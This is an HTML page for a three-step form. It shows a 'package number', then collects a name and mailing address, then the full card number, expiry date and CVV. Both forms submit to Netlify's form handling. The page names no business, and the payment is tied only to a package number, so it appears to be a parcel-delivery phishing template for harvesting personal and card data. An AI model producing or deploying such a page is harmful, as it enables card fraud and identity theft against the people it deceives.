<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Form</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <!-- Page 1 -->
  <div id="page1" class="container">
    <header>
      <h2>Welcome to Page 1</h2>
    </header>
    <p>Your package number is <span id="packageNumber"></span>.</p>
    <button onclick="showPage(2)">Continue</button>
  </div>

  <!-- Page 2: Mailing Address -->
  <div id="page2" class="container hidden">
    <header>
      <h2>Mailing Address</h2>
    </header>
    <form name="addressForm" method="POST" data-netlify="true" onsubmit="handleAddressSubmit(event)">
      <input type="hidden" name="form-name" value="addressForm">
      <label for="name">Name:</label>
      <input type="text" id="name" name="name" required>

      <label for="address">Address:</label>
      <input type="text" id="address" name="address" required>

      <label for="city">City:</label>
      <input type="text" id="city" name="city" required>

      <label for="state">State:</label>
      <input type="text" id="state" name="state" required>

      <label for="zip">Postal Code:</label>
      <input type="text" id="zip" name="zip" required>

      <button type="submit">Submit Address</button>
    </form>
  </div>

  <!-- Page 3: Payment -->
  <div id="page3" class="container hidden">
    <header>
      <h2>Payment Information</h2>
    </header>
    <form name="paymentForm" method="POST" data-netlify="true" onsubmit="handlePaymentSubmit(event)">
      <input type="hidden" name="form-name" value="paymentForm">
      <label for="cardholder">Cardholder Name:</label>
      <input type="text" id="cardholder" name="cardholder" required>

      <label for="cardNumber">Card Number:</label>
      <input type="text" id="cardNumber" name="cardNumber" required>

      <label for="expiryDate">Expiry Date:</label>
      <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>

      <label for="cvv">CVV:</label>
      <input type="text" id="cvv" name="cvv" required>

      <button type="submit">Submit Payment</button>
    </form>
  </div>

  <script src="script.js"></script>
</body>
</html>
